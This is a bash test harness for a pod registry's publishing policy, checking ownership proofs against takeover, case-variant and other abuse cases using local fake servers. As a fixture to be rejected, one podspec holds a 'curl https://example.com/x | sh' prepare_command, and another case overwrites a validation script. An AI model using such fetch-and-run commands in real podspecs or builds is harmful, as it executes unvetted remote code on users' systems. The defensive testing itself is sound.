#!/usr/bin/env bash
# Exercises publish-policy.sh (and the verify-trunk-owner.sh checks it
# runs) against a disposable local git repository and local stand-ins for
# everything they read over the network: CocoaPods' CDN as files read over
# file://, CocoaPods trunk's API, the GitHub API and a pod's website as a
# local HTTP server, and GitHub-hosted repositories as local bare repos.
# Covers each kind of pull request that publishes automatically and each
# one rejected automatically, including the namespace-takeover and
# case-variant attacks the ownership proofs have to resist.
#
# Usage: scripts/test-publish-policy.sh
# Exits non-zero if any scenario's actual result doesn't match its
# expected one.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POLICY="$SCRIPT_DIR/publish-policy.sh"

WORK_DIR="$(mktemp -d)"
SERVER_PID=""
cleanup() {
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
  rm -rf "$WORK_DIR"
}
trap cleanup EXIT

md5_hex() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -c1-32
  else
    md5 -q -s "$1"
  fi
}
json() { # <path under WORK_DIR, without .json> <JSON>
  mkdir -p "$(dirname "$WORK_DIR/$1")"
  printf '%s\n' "$2" > "$WORK_DIR/$1.json"
}

# --- local HTTP server: /api/<path> and /trunk/<path> answer from
# api/<path>.json and trunk/<path>.json (ignoring any query string, as the
# scripts re-check the GitHub API's own filtering); anything else is a
# pod's website, from site/ ---
cat > "$WORK_DIR/fake_server.py" <<'PY'
import http.server, os, sys, urllib.parse

root, port = sys.argv[1], int(sys.argv[2])

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        for prefix, folder in (("/api/", "api"), ("/trunk/", "trunk")):
            if path.startswith(prefix):
                f = os.path.join(root, folder, path[len(prefix):].rstrip("/") + ".json")
                if os.path.isfile(f):
                    body = open(f, "rb").read()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()
                return
        super().do_GET()

    def log_message(self, *args):
        pass

server = http.server.ThreadingHTTPServer(
    ("127.0.0.1", port),
    lambda *a, **k: Handler(*a, directory=os.path.join(root, "site"), **k),
)
server.serve_forever()
PY
mkdir -p "$WORK_DIR/site/.well-known"
printf '6001\nerin\n' > "$WORK_DIR/site/.well-known/zorvok-owners"
PORT="$(python3 -c 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1])')"
python3 "$WORK_DIR/fake_server.py" "$WORK_DIR" "$PORT" &
SERVER_PID=$!
for _ in $(seq 50); do
  curl -fs "http://127.0.0.1:$PORT/.well-known/zorvok-owners" >/dev/null 2>&1 && break
  sleep 0.1
done
LOCAL="http://127.0.0.1:$PORT"

# --- CocoaPods trunk: its CDN (pod list, index, podspecs) and its API ---
CDN="$WORK_DIR/cdn"
mkdir -p "$CDN"
trunk_pod() { # <name> <version> <published, "YYYY-MM-DD"> <podspec JSON>
  local h shard dir
  h="$(md5_hex "$1")"
  shard="$CDN/all_pods_versions_${h:0:1}_${h:1:1}_${h:2:1}.txt"
  dir="$CDN/Specs/${h:0:1}/${h:1:1}/${h:2:1}/$1/$2"
  mkdir -p "$dir"
  if grep -q "^$1/" "$shard" 2>/dev/null; then
    sed -i.bak "s|^$1/.*|&/$2|" "$shard" && rm -f "$shard.bak"
  else
    echo "$1/$2" >> "$shard"
    echo "$1" >> "$CDN/all_pods.txt"
  fi
  printf '%s\n' "$4" > "$dir/$1.podspec.json"
  printf '%s %s\n' "$2" "$3" >> "$WORK_DIR/versions-$1"
}
github_source() { # <name> <version> <owner/repo>
  printf '{"name": "%s", "version": "%s", "homepage": "https://github.com/%s", "source": {"git": "https://github.com/%s.git", "tag": "%s"}}' "$1" "$2" "$3" "$3" "$2"
}
trunk_api() { # <name> <owner emails, comma-separated>
  local owners versions
  owners="$(tr ',' '\n' <<<"$2" | awk 'NF { printf "%s{\"email\": \"%s\"}", (n++ ? ", " : ""), $1 }')"
  versions="$(awk '{ printf "%s{\"name\": \"%s\", \"created_at\": \"%s 12:00:00 UTC\"}", (n++ ? ", " : ""), $1, $2 }' "$WORK_DIR/versions-$1")"
  json "trunk/pods/$1" "{\"owners\": [$owners], \"versions\": [$versions]}"
}

# OwnedPod moved from oldowner to RealOwner in 1.10.0. Listed out of
# order, so only a real version sort finds the latest.
trunk_pod OwnedPod 1.10.0 2020-06-01 "$(github_source OwnedPod 1.10.0 RealOwner/OwnedPod)"
trunk_pod OwnedPod 1.9.0 2019-01-01 "$(github_source OwnedPod 1.9.0 oldowner/OwnedPod)"
trunk_api OwnedPod real@owner.dev
# RecycledPod's account was deleted; someone re-registered the username later.
trunk_pod RecycledPod 2.0.0 2020-01-01 "$(github_source RecycledPod 2.0.0 ghostuser/RecycledPod)"
trunk_api RecycledPod ghost@old.dev
trunk_pod OrgPod 2.0.0 2021-01-01 "$(github_source OrgPod 2.0.0 acme/OrgPod)"
trunk_api OrgPod frank@pods.dev,GRACE@pods.dev
trunk_pod FilePod 3.0.0 2021-01-01 "$(github_source FilePod 3.0.0 acme/FilePod)"
trunk_api FilePod owner@acme.dev
trunk_pod SitePod 4.0.0 2021-01-01 '{"name": "SitePod", "version": "4.0.0", "homepage": "'"$LOCAL"'/sitepod", "source": {"http": "'"$LOCAL"'/SitePod-4.0.0.zip"}}'
trunk_api SitePod vendor@site.dev
# BrandNewPod isn't on trunk.
echo "UnrelatedPod" >> "$CDN/all_pods.txt"

# --- the GitHub API: accounts by ID, organizations by name, repositories ---
user() { # <id> <login> <created YYYY-MM-DD> [public email]
  local email=null
  [ -n "${4:-}" ] && email="\"$4\""
  json "api/user/$1" "{\"login\": \"$2\", \"id\": $1, \"email\": $email, \"created_at\": \"$3T00:00:00Z\"}"
  json "api/users/$2" "{\"login\": \"$2\", \"id\": $1, \"created_at\": \"$3T00:00:00Z\"}"
}
repo() { # <owner/repo> <owner id> <owner type> <created YYYY-MM-DD>
  json "api/repos/$1" "{\"full_name\": \"$1\", \"owner\": {\"login\": \"${1%/*}\", \"id\": $2, \"type\": \"$3\"}, \"created_at\": \"$4T00:00:00Z\"}"
}
user 1001 alice 2015-01-01
user 1002 bob 2015-01-01
user 2001 frank 2015-01-01 Frank@Pods.dev
user 2002 grace 2015-01-01
user 2003 henry 2015-01-01
user 2004 carol 2015-01-01
user 3001 RealOwner 2015-01-01
user 3002 ghostuser 2024-03-01
user 3003 oldowner 2014-01-01
user 4001 dave 2015-01-01
user 5000 acme 2017-01-01
user 6001 erin 2015-01-01
user 9001 mallory 2015-01-01
repo RealOwner/OwnedPod 3001 User 2016-01-01
repo oldowner/OwnedPod 3003 User 2014-06-01
repo ghostuser/RecycledPod 3002 User 2024-03-02
repo acme/OrgPod 5000 Organization 2018-01-01
repo acme/FilePod 5000 Organization 2018-01-01
json api/orgs/acme/public_members/carol '{}'
# Commits on acme/OrgPod, each credited by GitHub to an account.
json api/repos/acme/OrgPod/commits '[
  {"author": {"login": "grace", "id": 2002}, "commit": {"author": {"email": "grace@pods.dev"}}},
  {"author": {"login": "henry", "id": 2003}, "commit": {"author": {"email": "henry@other.dev"}}}
]'

# --- GitHub-hosted repositories: acme/FilePod lists dave in .zorvok-owners ---
GH="$WORK_DIR/gh"
git init -q -b main "$WORK_DIR/filepod"
printf '# Zorvok publishers\n4001 dave\n' > "$WORK_DIR/filepod/.zorvok-owners"
git -C "$WORK_DIR/filepod" add -A
git -C "$WORK_DIR/filepod" -c user.email=t@e.com -c user.name=T commit -q -m init
mkdir -p "$GH/acme"
git clone -q --bare "$WORK_DIR/filepod" "$GH/acme/FilePod.git"

export TRUNK_CDN_URL="file://$CDN" TRUNK_API_URL="$LOCAL/trunk" GITHUB_API_URL="$LOCAL/api" GITHUB_SERVER_URL="file://$GH"
export GIT_ALLOW_PROTOCOL=file ZORVOK_FETCH_PROTO="=https,http,file"
unset GH_TOKEN

# --- base state: ExistingPod 1.0.0, owned by alice (user 1001) ---
mkdir -p "$WORK_DIR/repo"
cd "$WORK_DIR/repo"
git init -q -b main
git config user.email "test@example.com"
git config user.name "Test Harness"
mkdir -p Specs/ExistingPod/1.0.0 scripts
echo '{"name": "ExistingPod", "version": "1.0.0"}' > Specs/ExistingPod/1.0.0/ExistingPod.podspec.json
printf '1001 alice\n' > Specs/ExistingPod/OWNERS
echo 'echo ok' > scripts/validate-pr.sh
git add -A
git commit -q -m "seed: ExistingPod 1.0.0 owned by alice"
BASE="$(git rev-parse HEAD)"

pass=0
fail=0
CASE_ID=""
CASE_LOGIN=""
CASE_CDN=""
SKIP_ADD=""

# run_case <description> <expect: publish|reject> <author "id login"> <setup-function> [text the output must contain]
run_case() {
  local desc="$1" expect="$2" setup_fn="$4" want="${5:-}"
  CASE_ID="${3%% *}"
  CASE_LOGIN="${3#* }"

  git checkout -q -b "case-$RANDOM" "$BASE"
  "$setup_fn"
  [ -n "$SKIP_ADD" ] || git add -A
  git commit -q -m "$desc"
  SKIP_ADD=""

  local out got="publish"
  if ! out="$(TRUNK_CDN_URL="${CASE_CDN:-$TRUNK_CDN_URL}" "$POLICY" "$BASE" HEAD "$CASE_ID" "$CASE_LOGIN" 2>&1)"; then
    got="reject"
  fi

  if [ "$got" = "$expect" ] && { [ -z "$want" ] || grep -F -- "$want" <<<"$out" >/dev/null; }; then
    echo "PASS (as expected: $expect) - $desc"
    pass=$((pass + 1))
  else
    echo "FAIL (expected $expect${want:+, mentioning \"$want\"}; got $got) - $desc"
    # shellcheck disable=SC2001 # indents every line of a multi-line string
    sed 's/^/  /' <<<"$out"
    fail=$((fail + 1))
  fi
  git checkout -q -f main
  CASE_CDN=""
}

podspec() { # <name> <version> [extra JSON fields]
  mkdir -p "Specs/$1/$2"
  printf '{"name": "%s", "version": "%s"%s}\n' "$1" "$2" "${3:-}" > "Specs/$1/$2/$1.podspec.json"
}
claim() { # <name>: a first version here, owned by the case's author
  podspec "$1" 9.9.9
  printf '%s %s\n' "$CASE_ID" "$CASE_LOGIN" > "Specs/$1/OWNERS"
}

setup_owner_update()      { podspec ExistingPod 2.0.0; }
setup_new_pod()           { claim BrandNewPod; }
setup_claim_owned_pod()   { claim OwnedPod; }
setup_claim_recycled()    { claim RecycledPod; }
setup_claim_org_pod()     { claim OrgPod; }
setup_claim_file_pod()    { claim FilePod; }
setup_claim_site_pod()    { claim SitePod; }
setup_case_variant_trunk(){ claim ownedpod; }
# Built in git directly: on a case-insensitive disk (macOS's default),
# Specs/existingpod and Specs/ExistingPod are the same folder, but on
# GitHub's runners and in git itself they're different paths.
setup_case_variant_here() {
local spec owners
spec="$(printf '{"name": "existingpod", "version": "9.9.9"}\n' | git hash-object -w --stdin)"
owners="$(printf '%s %s\n' "$CASE_ID" "$CASE_LOGIN" | git hash-object -w --stdin)"
git update-index --add --cacheinfo "100644,$spec,Specs/existingpod/9.9.9/existingpod.podspec.json"
git update-index --add --cacheinfo "100644,$owners,Specs/existingpod/OWNERS"
SKIP_ADD=1
}
setup_two_pods()          { claim BrandNewPod; claim AnotherNewPod; }
setup_symlink()           { mkdir -p Specs/ExistingPod/2.0.0; ln -s ../1.0.0/ExistingPod.podspec.json Specs/ExistingPod/2.0.0/ExistingPod.podspec.json; }
setup_add_owner()         { printf '1001 alice\n1002 bob\n' > Specs/ExistingPod/OWNERS; }
setup_add_self_owner()    { printf '1001 alice\n9001 mallory\n' > Specs/ExistingPod/OWNERS; }
setup_empty_owners()      { printf '# nobody\n' > Specs/ExistingPod/OWNERS; }
setup_script_edit()       { podspec ExistingPod 2.0.0; echo 'echo pwned' > scripts/validate-pr.sh; }
setup_owners_only()       { mkdir -p Specs/ClaimedName; printf '9001 mallory\n' > Specs/ClaimedName/OWNERS; }
setup_prepare_command()   { podspec ExistingPod 2.0.0 ', "prepare_command": "curl https://example.com/x | sh"'; }

run_case "an owner publishes a new version"                                  publish "1001 alice"     setup_owner_update
run_case "a new pod whose name isn't on CocoaPods trunk"                     publish "1002 bob"       setup_new_pod
run_case "a trunk pod, by a trunk owner whose GitHub email is public"        publish "2001 frank"     setup_claim_org_pod
run_case "a trunk pod, by a trunk owner GitHub credits with commits"         publish "2002 grace"     setup_claim_org_pod
run_case "a trunk pod, by a committer whose email isn't a trunk owner's"     reject  "2003 henry"     setup_claim_org_pod   "pod trunk register"
run_case "a trunk pod, by the account that owns its repo (older than it)"    publish "3001 realowner" setup_claim_owned_pod
run_case "a trunk pod, by its repo's previous owner"                         reject  "3003 oldowner"  setup_claim_owned_pod "file named .zorvok-owners"
run_case "a trunk pod, by a re-registered username newer than the release"   reject  "3002 ghostuser" setup_claim_recycled  "was created after CocoaPods trunk published RecycledPod 2.0.0"
run_case "a trunk pod, by a public member of the owning org (not proof)"     reject  "2004 carol"     setup_claim_org_pod   "only its owners there can publish it here"
run_case "a trunk pod whose repo lists the publisher's ID in .zorvok-owners" publish "4001 dave"      setup_claim_file_pod
run_case "a binary-only trunk pod, by its website's listed owner (not proof)" reject "6001 erin"      setup_claim_site_pod  "pod trunk register"
run_case "a trunk pod, by someone else"                                      reject  "9001 mallory"   setup_claim_owned_pod "only its owners there can publish it here"
run_case "a name differing only in case from a trunk pod"                    reject  "9001 mallory"   setup_case_variant_trunk "differs only in letter case from OwnedPod"
run_case "a name differing only in case from a pod already here"             reject  "9001 mallory"   setup_case_variant_here  "differs from existingpod only in letter case"
run_case "two pods in one pull request"                                      reject  "1002 bob"       setup_two_pods        "can change only one pod at a time"
run_case "a podspec added as a symlink"                                      reject  "1001 alice"     setup_symlink         "isn't a plain file"
run_case "an owner adds a co-owner"                                          publish "1001 alice"     setup_add_owner
run_case "a non-owner adds themselves to a pod's OWNERS"                     reject  "9001 mallory"   setup_add_self_owner  "only a current owner of ExistingPod"
run_case "an owner removes every owner"                                      reject  "1001 alice"     setup_empty_owners    "left with no owners"
run_case "a version plus a change to the registry's own scripts"             reject  "1001 alice"     setup_script_edit     "scripts/validate-pr.sh: a publish can only add podspecs"
run_case "an OWNERS file with no version (claiming a bare name)"             reject  "9001 mallory"   setup_owners_only     "without a version of ClaimedName"
run_case "a podspec that uses prepare_command"                               reject  "1001 alice"     setup_prepare_command "uses prepare_command"
CASE_CDN="file://$WORK_DIR/no-such-cdn"
run_case "a new pod when CocoaPods trunk can't be reached"                   reject  "1002 bob"       setup_new_pod         "couldn't be reached"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
